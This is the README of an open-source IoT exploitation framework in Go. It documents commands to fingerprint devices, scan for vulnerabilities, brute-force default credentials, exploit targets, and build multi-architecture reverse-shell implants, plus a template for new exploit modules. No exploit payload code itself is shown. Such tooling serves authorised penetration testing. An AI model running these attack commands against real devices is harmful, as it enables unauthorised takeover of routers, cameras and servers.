# GoAccess — IoT Exploitation Framework

GoAccess is an active IoT exploitation framework written entirely in Go (`CGO_ENABLED=0`) with zero runtime dependencies.
It provides a CLI tool with three operational modes (`identify`, `scan`, `access`) and is designed as a reusable library.

## Features

- **174 exploit modules** covering 55 vendors (D-Link, Cisco, Netgear, TP-Link, MikroTik, Huawei, WordPress, Tomcat, Jenkins, JBoss, SAP, and more)
- **184 credential modules** with vendor-specific default wordlists and brute-force capabilities
- **5 password generators** for MAC/serial-derived credentials (D-Link, TP-Link, Thomson, NETGEAR)
- **Pure Go protocol clients**: HTTP/HTTPS, TCP, UDP, SSH, Telnet, FTP, SNMP
- **Zero CGO dependencies**: all protocols use pure Go libraries (`golang.org/x/crypto/ssh`, `github.com/jlaffaye/ftp`, `github.com/gosnmp/gosnmp`)
- **Multi-arch reverse shell payloads**: ARM, ARM64, MIPS, MIPSLE, MIPS64, x86, x86_64
- **Channel-based worker pool** for concurrent scanning
- **JSON output** for all commands with `--json` and `--output` flags

## Installation

```bash
git clone https://github.com/cookiengineer/goaccess.git
cd goaccess
make build
```

Requires Go 1.22+. Binary outputs to `bin/goaccess`.

## Quick Start

```bash
# Identify a target device
./bin/goaccess identify 192.168.1.1

# Scan for vulnerabilities
./bin/goaccess scan 192.168.1.1 --threads 32

# Actively exploit and gain access
./bin/goaccess access 192.168.1.1 --listen :4444

# List registered modules
./bin/goaccess list exploits --vendor dlink
./bin/goaccess list credentials --vendor tplink
./bin/goaccess list payloads
./bin/goaccess list keys
./bin/goaccess list vendors
```

## Commands

### `goaccess identify <target>`

Fingerprint target hardware via port scanning, MAC OUI lookup, HTTP banner grab, UPnP SSDP probe, and SNMP sysDescr.

```bash
goaccess identify 192.168.1.1
goaccess identify 192.168.1.1 --json --output result.json
goaccess identify 192.168.1.1 --oui-only
goaccess identify 192.168.1.1 --verbose
```

| Flag | Default | Description |
|------|---------|-------------|
| `--json` | false | Output as JSON |
| `--output` | — | Write JSON output to file |
| `--oui-only` | false | Only show OUI vendor lookup |
| `--verbose` | false | Verbose output |
| `--threads` | 8 | Number of parallel threads |
| `--timeout` | 8 | Timeout in seconds |

### `goaccess scan <target>`

Scan for vulnerabilities and default credentials.

```bash
goaccess scan 192.168.1.1
goaccess scan 192.168.1.1 --vendor dlink --type router
goaccess scan 192.168.1.1 --threads 32 --timeout 10
goaccess scan 192.168.1.1 --skip-creds
goaccess scan 192.168.1.1 --username admin --password password --vendor wordpress
goaccess scan 192.168.1.1 --json --output results.json
```

| Flag | Default | Description |
|------|---------|-------------|
| `--vendor` | — | Filter exploits by vendor |
| `--type` | — | Filter by device type (router, camera, drone, server, misc) |
| `--threads` | 8 | Number of parallel threads |
| `--timeout` | 8 | Timeout in seconds |
| `--skip-creds` | false | Skip credential checks |
| `--skip-exploits` | false | Skip exploit checks |
| `--username` | admin | Username for authenticated takeover |
| `--password` | — | Password for authenticated takeover |
| `--password-list` | — | File of passwords to try with `--username` |
| `--json` | false | Output as JSON (streams results) |
| `--output` | — | Write JSON array to file |
| `--verbose` | false | Verbose output |

### `goaccess access <target>`

Actively exploit a target to gain access.

```bash
goaccess access 192.168.1.1
goaccess access 192.168.1.1 --payload arm --listen :4444
goaccess access 192.168.1.1 --shell
goaccess access 192.168.1.1 --no-creds    # exploit only
goaccess access 192.168.1.1 --no-exploit   # creds only
goaccess access 192.168.1.1 --username admin --password password --vendor wordpress
goaccess access 192.168.1.1 --username admin --password-list rockyou.txt
```

| Flag | Default | Description |
|------|---------|-------------|
| `--threads` | 8 | Number of parallel threads |
| `--timeout` | 8 | Timeout in seconds |
| `--payload` | — | Preferred payload architecture |
| `--listen` | 0 | Listen port for reverse shells |
| `--shell` | false | Drop to interactive shell |
| `--no-exploit` | false | Skip exploitation, creds only |
| `--no-creds` | false | Skip credential checks |
| `--vendor` | — | Filter exploits by vendor |
| `--type` | — | Filter exploits by device type |
| `--username` | admin | Username for authenticated takeover |
| `--password` | — | Password for authenticated takeover |
| `--password-list` | — | File of passwords to try with `--username` |
| `--json` | false | Output as JSON |
| `--output` | — | Write JSON output to file |
| `--verbose` | false | Verbose output |

### `goaccess list <resource>`

List registered modules.

```bash
goaccess list exploits         # all exploit modules
goaccess list exploits --vendor dlink
goaccess list credentials       # all credential modules
goaccess list payloads          # available payload architectures
goaccess list keys              # SSH hardcoded keys
goaccess list vendors           # all vendor names
```

## Build Payloads

Cross-compile reverse shell implants for all architectures:

```bash
make payloads
```

This produces 14 static binaries under `payload/`:

| Arch | Reverse TCP | Bind TCP |
|------|-------------|----------|
| arm (ARMv5) | `payload/arm/reverse_tcp` | `payload/arm/bind_tcp` |
| arm64 | `payload/arm64/reverse_tcp` | `payload/arm64/bind_tcp` |
| mips | `payload/mips/reverse_tcp` | `payload/mips/bind_tcp` |
| mipsle | `payload/mipsle/reverse_tcp` | `payload/mipsle/bind_tcp` |
| mips64 | `payload/mips64/reverse_tcp` | `payload/mips64/bind_tcp` |
| x86 | `payload/x86/reverse_tcp` | `payload/x86/bind_tcp` |
| x86_64 | `payload/x86_64/reverse_tcp` | `payload/x86_64/bind_tcp` |

## Library Usage

GoAccess is designed as a library. Import and use it from your own Go programs:

```go
import (
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/scanner"
    "github.com/cookiengineer/goaccess/types"
)

func main() {
    config := &types.ScanConfig{
        Target:  "192.168.1.1",
        Threads: 16,
        Timeout: 10 * time.Second,
    }
    engine := scanner.NewScanner(config)

    // Identify
    result, _ := engine.Identify("192.168.1.1", config)

    // Scan
    ch, _ := engine.Scan("192.168.1.1", config)
    for r := range ch {
        if r.Vulnerability.Confirmed {
            fmt.Println("VULN:", r.Exploit.Name)
        }
    }

    // Access
    accessResult, _ := engine.Access("192.168.1.1", config)
}
```

## Protocol Clients

Each protocol package exports a reusable client struct:

```go
import (
    protocolhttp "github.com/cookiengineer/goaccess/protocols/http"
    "github.com/cookiengineer/goaccess/protocols/ssh"
    "github.com/cookiengineer/goaccess/protocols/telnet"
)

// HTTP
httpClient := protocolhttp.NewClient()
httpClient.Target = "192.168.1.1"
httpClient.SetBasicAuth("admin", "password")
resp, _ := httpClient.Get("/", nil)

// SSH
sshClient := ssh.NewClient()
sshClient.Target = "192.168.1.1"
sshClient.Login("root", "password")

// Telnet
telnetClient := telnet.NewClient()
telnetClient.Target = "192.168.1.1"
telnetClient.Login("admin", "admin")
```

## Writing Exploits

See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for a step-by-step guide on writing new exploit modules.

Quick template:

```go
package my_exploit

import (
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/protocols/http"
    "github.com/cookiengineer/goaccess/types"
)

type Exploit struct { httpClient *http.Client }

func init() { exploit.Register(&Exploit{httpClient: http.NewClient()}) }

func (e *Exploit) Info() *types.Info {
    return &types.Info{Name: "My Exploit", Vendor: "myvendor", DeviceType: types.DeviceRouter}
}
func (e *Exploit) Options() *types.Options { return &types.Options{Port: 80} }
func (e *Exploit) Protocol() types.Protocol { return types.ProtocolHTTP }
func (e *Exploit) Fingerprints() []*types.Fingerprint { return nil }
func (e *Exploit) Check(target string, opts *types.Options) (*types.VulnResult, error) { /* ... */ }
func (e *Exploit) Run(target string, opts *types.Options) (*types.ExploitResult, error) { /* ... */ }

var _ interfaces.Exploit = (*Exploit)(nil)
```

Then add a blank import to `exploits/imports.go`:

```go
import _ "github.com/cookiengineer/goaccess/exploits/routers/myvendor/my_exploit"
```

## Architecture

```
goaccess/
├── interfaces/        # All interfaces: Exploit, Scanner, PasswordGenerator
├── types/             # All data types: Info, Options, ScanConfig, ScanResult
├── exploit/           # Global registry (Register, ByVendor, ByModel, Get)
├── scanner/           # Scan engine (Identify, Scan, Access with worker pool)
├── protocols/         # Pure Go clients: http, tcp, udp, ssh, telnet, ftp, snmp
├── exploits/          # 174 exploit modules + 184 credential modules
│   ├── generic/       # Heartbleed, Shellshock, RomPager, TCP-32764, GPON
│   ├── routers/       # D-Link, Cisco, Netgear, TP-Link, MikroTik, ...
│   ├── cameras/       # Brickcom, Grandstream, Honeywell, Siemens, ...
│   ├── drones/        # DJI, Parrot, Tello, DB Power
│   ├── servers/       # WordPress, Joomla, Drupal, Tomcat, Jenkins, SAP, Magento, ...
│   └── misc/          # ASUS projector, Miele, WatchGuard, WePresent
├── shell/             # Reverse/bind shell handler + listener
├── payload/           # Pre-built multi-arch reverse shell binaries
├── wordlist/          # Embedded credential dictionaries (go:embed)
├── oui/               # MAC OUI vendor database (23,798 entries)
├── ssh_keys/          # Known hardcoded SSH private keys (9 vendors)
├── parsers/           # Config file parsers for credential extraction
├── libs/              # lzs (ROM-0), sqlinject (SQLi engine), webapp (web app helpers)
├── report/            # Colorized CLI output + JSON formatting
└── cmds/
    ├── goaccess/      # Main CLI binary
    └── rshell/        # Reverse shell implant
```

## Testing

```bash
# Run all tests
CGO_ENABLED=0 go test ./...

# Run tests with podman integration tests
CGO_ENABLED=0 go test -v -run Integration ./scanner/

# Lint
go vet ./...

# Build + test + vet
make build && make test && make lint
```

## Docker

Multi-arch Docker build for cross-compilation:

```bash
docker build --platform linux/arm64 -t goaccess:arm64 .
docker build --platform linux/mipsle -t goaccess:mipsle .
```

GitHub Actions CI builds and tests on every push, and cross-compiles all 7 payload architectures on release.

## License

See [LICENSE](LICENSE) for details.
